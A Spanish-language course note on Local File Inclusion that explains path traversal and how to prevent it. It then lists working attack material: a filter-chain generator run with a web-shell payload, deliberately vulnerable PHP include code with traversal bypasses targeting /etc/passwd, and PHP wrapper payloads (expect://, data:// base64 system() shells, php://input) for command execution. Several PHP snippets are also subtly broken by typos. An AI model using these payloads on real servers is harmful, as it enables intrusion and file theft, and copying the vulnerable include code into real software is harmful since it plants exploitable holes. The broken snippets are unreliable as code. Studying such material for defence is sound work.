- Tags: #lfi #recursos_github #python_script #php 

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
Ejemplo :
```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator 

python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
?>
```



Ejemplo nos montamos un fichero con codigo php y levantamos un servidor de apache server
en /var/www/html/index.php
```php
#Peticion desde el navegador
http://ip:port/index.php?filename=/etc/passwd

#BASICO
<?php
$filename=$_GET['filename']
include($filename)
?>

#Peticion desde el navegador
http://ip:port/index.php?filename=../../../../../etc/passwd

#SANITISADO 1
<?php
$filename=$_GET['filename']
include("/var/www/html" .$filename)
?>

#Peticion desde el navegador
http://ip:port/index.php?filename=....//....//....//....//....//etc/passwd

#SANITISADO 2
<?php
$filename=$_GET['filename']
$filename=str_replace("../","",$fielename)
include("/var/www/html" .$filename)
?>

#Peticion desde el navegador
http://ip:port/index.php?filename=....//....//....//....//....//etc/////passwd
http://ip:port/index.php?filename=....//....//....//....//....//etc/./././/passwd

#SANITISADO 3
<?php
$filename=$_GET['filename']
$filename=str_replace("../","",$fielename)
if(preg_match("/\/etc\/passwd/")){
}
else{
}
include("/var/www/html" .$filename)
?>
```

#wrappers
Empleamos wrappers para poder ver el código php que se ejecuta en en archivo
Ejemplo php//filter/convert/base64-encode/resource=file.php
```php
http://ip:port/index.php?page=php://filter/convert.base64-encode/resource=file.php

Wraper de rotacion de caracteres, devuelve la info con los caracteres rotados 13 posiciones
http://ip:port/index.php?page=php://filter/read=string.rot13/resource=file.php

El resultado se pone en un fichero y se le hace el proceso inverso con tr

cat file | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'

Wraper para convertir de UTF-8 a UTF-16
http://ip:port/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=file.php

Wraper  espect
http://ip:port/index.php?filename=expect://whoami

Wraper  data se le pasa una cadena en base64 eje "<?php system('whoami')>"
http://ip:port/index.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=

eje <?php system($_GET["cmd"]); ?>
http://ip:port/index.php?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=whoami

http://ip:port/index.php?filename=data://text/plain;base64-decode/resource=/tmp/test

Codificando
http://ip:port/index.php?page=php://filter/convert.iconv.utf-8.utf-7/resource=file.php

http://ip:port/index.php?page=php://filter/convert.iconv.utf-8.csiso2022kr/resource=file.php

Wraper  input se usa con peticiones POST y se envia por parametro <?php system("whoami") ?>
http://ip:port/index.php?filename=php://input

```

Esto lo que hace es llamar al fichero pero no lo interpreta ya que esta en base 64 y nos lo muestra en el navegador luego copiaríamos este código en base64 lo decodificamos y podemos ver el contenido original